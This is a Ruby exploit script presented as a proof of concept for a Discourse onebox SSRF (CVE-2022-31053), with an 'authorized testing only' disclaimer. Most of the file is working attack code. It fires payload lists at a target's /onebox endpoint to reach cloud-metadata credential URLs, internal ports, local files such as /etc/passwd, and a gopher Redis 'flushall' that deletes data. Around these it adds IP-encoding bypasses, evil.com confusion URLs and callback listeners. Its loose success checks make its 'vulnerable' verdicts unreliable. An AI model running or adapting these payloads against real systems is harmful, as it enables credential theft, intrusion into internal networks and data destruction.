#!/usr/bin/env ruby

# CVE-2022-31053: Discourse SSRF via Onebox URL Preview
# Severity: High
# CVSS: 8.6
#
# Description:
# Server-Side Request Forgery (SSRF) vulnerability in Discourse onebox
# URL preview functionality allowing attackers to access internal resources.
#
# Affected Versions:
# - Discourse < 2.8.5
# - Discourse < 2.9.0.beta6
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'socket'
require 'thread'

class CVE_2022_31053
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @collaborator_domain = 'burpcollaborator.net'
    @results = {
      cve: 'CVE-2022-31053',
      vulnerable: false,
      severity: 'High',
      cvss: 8.6,
      details: [],
      payloads: [],
      ssrf_evidence: []
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2022-31053 against #{@target_url}"
    puts "[*] Severity: High (CVSS: 8.6)"
    puts "[*] Description: SSRF via Discourse Onebox URL Preview"
    puts "-" * 60

    # Get CSRF token
    get_csrf_token

    # Test basic SSRF
    puts "[*] Testing basic SSRF via onebox..."
    test_basic_ssrf

    # Test bypass techniques
    puts "[*] Testing SSRF bypass techniques..."
    test_bypass_techniques

    # Test blind SSRF
    puts "[*] Testing blind SSRF..."
    test_blind_ssrf

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def start_http_server(port = 8888)
    # Start a simple HTTP server to catch SSRF callbacks
    Thread.new do
      begin
        server = TCPServer.new('0.0.0.0', port)
        puts "[*] HTTP server started on port #{port}"
        
        loop do
          client = server.accept
          request = client.gets
          
          if request
            puts "[+] SSRF callback received: #{request.strip}"
            
            # Read headers
            headers = []
            while (line = client.gets.strip) != ''
              headers << line
            end
            
            puts "[+] Headers: #{headers.join(', ')}"
            
            # Send response
            response = "HTTP/1.1 200 OK\r\n"
            response += "Content-Type: text/html\r\n"
            response += "Content-Length: 13\r\n"
            response += "\r\n"
            response += "SSRF Success!"
            
            client.print response
          end
          
          client.close
        end
      rescue => e
        puts "[!] Error in HTTP server: #{e.message}"
      end
    end
  end

  def test_basic_ssrf
    # SSRF payloads for onebox
    ssrf_payloads = [
      # Internal network enumeration
      'http://127.0.0.1:22',
      'http://127.0.0.1:80',
      'http://127.0.0.1:443',
      'http://127.0.0.1:3000',
      'http://127.0.0.1:5432',  # PostgreSQL
      'http://127.0.0.1:6379',  # Redis
      'http://127.0.0.1:9200',  # Elasticsearch
      'http://127.0.0.1:8080',
      'http://localhost:22',
      'http://localhost:3000',
      
      # Private IP ranges
      'http://192.168.1.1',
      'http://192.168.1.254',
      'http://10.0.0.1',
      'http://172.16.0.1',
      'http://172.31.0.1',
      
      # Cloud metadata endpoints
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://169.254.169.254/latest/user-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
      'http://169.254.169.254/metadata/instance?api-version=2017-08-01',
      'http://169.254.169.254/metadata/instance/compute/userData?api-version=2017-08-01&format=text',
      
      # File protocol (if supported)
      'file:///etc/passwd',
      'file:///etc/hosts',
      'file:///proc/self/environ',
      'file:///proc/version',
      'file:///var/log/nginx/access.log',
      
      # Protocol smuggling
      'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
      'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a',
      'dict://127.0.0.1:11211/stats',
      'ldap://127.0.0.1:389/dc=example,dc=com',
      'ftp://127.0.0.1:21/',
      
      # External callback URLs
      "http://#{@collaborator_domain}/ssrf-test",
      "https://#{@collaborator_domain}/ssrf-test",
      'http://httpbin.org/get',
      'http://postb.in/test',
      'http://webhook.site/unique-id'
    ]
    
    ssrf_payloads.each do |payload|
      test_ssrf_payload(payload)
      sleep(0.5)
    end
  end

  def test_ssrf_payload(payload)
    begin
      # Test onebox endpoint
      onebox_url = "#{@target_url}/onebox"
      
      form_data = {
        'url' => payload,
        'refresh' => 'true'
      }
      
      uri = URI(onebox_url)
      
      start_time = Time.now
      response = make_request(uri, 'POST', URI.encode_www_form(form_data), {
        'Content-Type' => 'application/x-www-form-urlencoded',
        'X-CSRF-Token' => @csrf_token || '',
        'X-Requested-With' => 'XMLHttpRequest'
      })
      response_time = Time.now - start_time
      
      if response && check_ssrf_success(response, payload, response_time)
        @results[:vulnerable] = true
        @results[:details] << "SSRF via onebox: #{payload}"
        @results[:payloads] << payload
        
        # Extract SSRF evidence
        evidence = extract_ssrf_evidence(response, payload)
        @results[:ssrf_evidence].concat(evidence) if evidence.any?
        
        puts "[+] SSRF successful: #{payload[0..50]}..."
      end
      
    rescue => e
      @results[:details] << "Error testing SSRF payload: #{e.message}"
    end
  end

  def test_bypass_techniques
    # Advanced bypass payloads
    bypass_payloads = [
      # Double URL encoding
      'http://127.0.0.1%253A22',
      'http://%31%32%37%2E%30%2E%30%2E%31:22',
      
      # Mixed encoding
      'http://127.0.0.1%3A22',
      'http://127.0.0.1%3a22',
      
      # IPv6 localhost
      'http://[::1]:22',
      'http://[0:0:0:0:0:0:0:1]:22',
      'http://[::ffff:127.0.0.1]:22',
      
      # Decimal IP
      'http://2130706433:22',  # 127.0.0.1 in decimal
      'http://3232235521:22',  # 192.168.1.1 in decimal
      
      # Octal IP
      'http://0177.0.0.1:22',
      'http://0300.0.0.1:22',
      
      # Hex IP
      'http://0x7f000001:22',
      'http://0x7f.0x0.0x0.0x1:22',
      
      # Mixed representations
      'http://127.1:22',
      'http://127.0.1:22',
      'http://127.1.1:22',
      
      # Domain confusion
      'http://127.0.0.1.evil.com',
      'http://evil.com.127.0.0.1.nip.io',
      'http://127.0.0.1--evil.com',
      
      # Bypass techniques
      'http://127.1:80',
      'http://0177.0.0.1:80',  # Octal
      'http://2130706433:80',  # Decimal
      'http://0x7f000001:80',  # Hex
      'http://127.0.0.1.xip.io',
      'http://127.0.0.1.nip.io',
      'http://127.0.0.1.sslip.io',
      "http://spoofed.#{@collaborator_domain}",
      
      # DNS rebinding
      'http://1ynrnhl.xip.io/secret',
      'http://vcap.me/admin',
      'http://localtest.me/internal',
      
      # Unicode bypass
      'http://127.0.0.1\\@evil.com/',
      'http://127.0.0.1\\\\evil.com/',
      'http://127.0.0.1%2f@evil.com/',
      
      # URL confusion
      'http://evil.com#127.0.0.1',
      'http://evil.com?127.0.0.1',
      'http://127.0.0.1@evil.com/',
      
      # CRLF injection
      'http://127.0.0.1:22%0d%0aHost: evil.com',
      'http://127.0.0.1:22%0a%0dHost: evil.com'
    ]
    
    bypass_payloads.each do |payload|
      test_bypass_payload(payload)
      sleep(0.3)
    end
  end

  def test_bypass_payload(payload)
    begin
      onebox_url = "#{@target_url}/onebox"
      
      form_data = {
        'url' => payload,
        'refresh' => 'true',
        'category_id' => '1'
      }
      
      uri = URI(onebox_url)
      response = make_request(uri, 'POST', URI.encode_www_form(form_data), {
        'Content-Type' => 'application/x-www-form-urlencoded',
        'X-CSRF-Token' => @csrf_token || ''
      })
      
      if response && check_bypass_success(response, payload)
        @results[:vulnerable] = true
        @results[:details] << "Bypass successful: #{payload}"
        @results[:payloads] << payload
        
        puts "[+] Bypass successful: #{payload[0..50]}..."
      end
      
    rescue => e
      @results[:details] << "Error testing bypass: #{e.message}"
    end
  end

  def test_blind_ssrf
    # Blind SSRF payloads
    blind_payloads = [
      # Time-based detection
      'http://httpbin.org/delay/5',
      'http://httpbin.org/delay/10',
      
      # DNS exfiltration
      "http://ssrf-test.#{@collaborator_domain}",
      "https://ssrf-test.#{@collaborator_domain}",
      
      # Callback URLs
      'http://postb.in/1234567890',
      'http://requestbin.net/r/1234567890',
      'http://webhook.site/unique-id-here',
      
      # Internal service detection
      'http://127.0.0.1:22',  # SSH
      'http://127.0.0.1:25',  # SMTP
      'http://127.0.0.1:53',  # DNS
      'http://127.0.0.1:110', # POP3
      'http://127.0.0.1:143', # IMAP
      'http://127.0.0.1:993', # IMAPS
      'http://127.0.0.1:995', # POP3S
      
      # Database ports
      'http://127.0.0.1:3306',  # MySQL
      'http://127.0.0.1:5432',  # PostgreSQL
      'http://127.0.0.1:6379',  # Redis
      'http://127.0.0.1:27017', # MongoDB
      'http://127.0.0.1:9200',  # Elasticsearch
      
      # Application ports
      'http://127.0.0.1:8080',
      'http://127.0.0.1:8000',
      'http://127.0.0.1:9000',
      'http://127.0.0.1:3000'
    ]
    
    blind_payloads.each do |payload|
      test_blind_payload(payload)
      sleep(1)
    end
  end

  def test_blind_payload(payload)
    begin
      onebox_url = "#{@target_url}/onebox"
      
      form_data = {
        'url' => payload
      }
      
      uri = URI(onebox_url)
      
      start_time = Time.now
      begin
        response = make_request(uri, 'POST', URI.encode_www_form(form_data), {
          'Content-Type' => 'application/x-www-form-urlencoded',
          'X-CSRF-Token' => @csrf_token || ''
        })
        response_time = Time.now - start_time
        
        if response && check_blind_ssrf(response, payload, response_time)
          @results[:vulnerable] = true
          @results[:details] << "Blind SSRF detected: #{payload}"
          @results[:payloads] << payload
          
          puts "[+] Blind SSRF detected: #{payload[0..50]}..."
        end
        
      rescue Net::ReadTimeout
        # Timeout might indicate successful SSRF
        response_time = Time.now - start_time
        if response_time > 20
          @results[:vulnerable] = true
          @results[:details] << "Blind SSRF timeout: #{payload}"
          @results[:payloads] << payload
          
          puts "[+] Blind SSRF timeout: #{payload[0..50]}..."
        end
      end
      
    rescue => e
      @results[:details] << "Error testing blind SSRF: #{e.message}"
    end
  end

  def check_ssrf_success(response, payload, response_time)
    return false unless response
    return false unless [200, 400, 500, 502, 503, 504].include?(response.code.to_i)
    
    content = response.body.downcase
    
    # SSRF success indicators
    ssrf_indicators = [
      # Connection errors (indicate internal access)
      'connection refused', 'connection timeout', 'connection reset',
      'no route to host', 'network is unreachable',
      'host is unreachable', 'destination unreachable',
      
      # HTTP errors from internal services
      'bad request', 'unauthorized', 'forbidden',
      'internal server error', 'bad gateway', 'service unavailable',
      
      # Service banners
      'ssh-', 'openssh', 'protocol version',
      'http/1.1', 'http/1.0', 'server:',
      
      # Database responses
      'redis', 'postgresql', 'mysql', 'mongodb',
      'elasticsearch', 'memcached',
      
      # Cloud metadata
      'metadata', 'aws', 'gce', 'azure', 'iam',
      'security-credentials', 'instance-identity',
      
      # File content indicators
      'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
      'localhost', '127.0.0.1', '::1',     # /etc/hosts
      
      # Onebox specific
      'onebox', 'preview', 'title', 'description',
      'image', 'favicon'
    ]
    
    ssrf_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Check for time-based SSRF
    if payload.include?('delay') && response_time > 4
      return true
    end
    
    # Check response headers for SSRF indicators
    headers = response.to_hash
    header_indicators = ['server', 'x-powered-by', 'x-frame-options']
    header_indicators.each do |header|
      return true if headers.key?(header)
    end
    
    false
  end

  def check_bypass_success(response, payload)
    check_ssrf_success(response, payload, 0)
  end

  def check_blind_ssrf(response, payload, response_time)
    # Time-based detection
    if payload.include?('delay') && response_time > 4
      return true
    end
    
    # Error-based detection
    content = response.body.downcase
    blind_indicators = [
      'connection refused', 'connection timeout',
      'network unreachable', 'host unreachable',
      'connection reset', 'no route to host'
    ]
    
    blind_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Status code based detection
    return true if [502, 503, 504].include?(response.code.to_i)
    
    false
  end

  def extract_ssrf_evidence(response, payload)
    evidence = []
    content = response.body
    
    # Extract server information
    server_header = response['server']
    evidence << "Server header: #{server_header}" if server_header
    
    # Extract metadata information
    # AWS metadata
    aws_match = content.match(/ami-[a-f0-9]{8,17}/i)
    evidence << "AWS AMI ID: #{aws_match[0]}" if aws_match
    
    # Instance ID
    instance_match = content.match(/i-[a-f0-9]{8,17}/i)
    evidence << "AWS Instance ID: #{instance_match[0]}" if instance_match
    
    # IP addresses
    ip_matches = content.scan(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/)
    ip_matches.first(3).each do |ip|
      unless ip.start_with?('127.') || ip.start_with?('0.')
        evidence << "IP address found: #{ip}"
      end
    end
    
    # Service banners
    if content.downcase.include?('ssh-')
      ssh_match = content.match(/ssh-[\w\.-]+/i)
      evidence << "SSH banner: #{ssh_match[0]}" if ssh_match
    end
    
    evidence
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    # Set up proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    # Set headers
    request['User-Agent'] = @user_agent
    request['Accept'] = 'application/json, text/javascript, */*; q=0.01'
    request['Accept-Language'] = 'en-US,en;q=0.9'
    
    # Add session cookies
    if !@session_cookies.empty?
      cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      request['Cookie'] = cookie_string
    end
    
    # Add custom headers
    headers.each { |k, v| request[k] = v }
    
    # Set body for POST requests
    if body && method.upcase == 'POST'
      request.body = body
      request['Content-Type'] ||= 'application/x-www-form-urlencoded'
    end
    
    begin
      response = http.request(request)
      
      # Update session cookies
      response.get_fields('set-cookie')&.each do |cookie|
        cookie_parts = cookie.split(';')[0].split('=')
        @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
      end
      
      response
    rescue => e
      puts "[!] Request failed: #{e.message}"
      nil
    end
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2022-31053 EXPLOIT SUMMARY"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Payloads tested: #{@results[:payloads].length}"
    
    if @results[:ssrf_evidence].any?
      puts "\nSSRF Evidence:"
      @results[:ssrf_evidence].each { |evidence| puts "  - #{evidence}" }
    end
    
    if @results[:details].any?
      puts "\nDetails:"
      @results[:details].each { |detail| puts "  - #{detail}" }
    end
  end

  def save_results
    filename = 'CVE-2022-31053_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "CVE-2022-31053: Discourse Onebox SSRF Exploit\n\n"
    opts.banner += "CVE-2022-31053 Details:\n"
    opts.banner += "  Severity: High (CVSS: 8.6)\n"
    opts.banner += "  Description: SSRF via Discourse onebox URL preview functionality\n"
    opts.banner += "  Affected: Discourse < 2.8.5, < 2.9.0.beta6\n\n"
    opts.banner += "Usage: ruby CVE-2022-31053.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('--callback-server', 'Start HTTP callback server') do
      options[:callback_server] = true
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby CVE-2022-31053.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = CVE_2022_31053.new(target_url, options)
    
    # Start callback server if requested
    if options[:callback_server]
      exploit.start_http_server
    end
    
    results = exploit.run_exploit
    
    if results[:vulnerable]
      puts "\n🚨 HIGH: Target is vulnerable to CVE-2022-31053!"
      puts "   SSRF possible via onebox URL preview!"
      puts "   Internal network access may be possible!"
    else
      puts "\n✅ Target appears to be patched against CVE-2022-31053"
    end
    
  rescue Interrupt
    puts "\n[!] Exploit interrupted by user"
  rescue => e
    puts "\n[!] Exploit failed: #{e.message}"
  end
end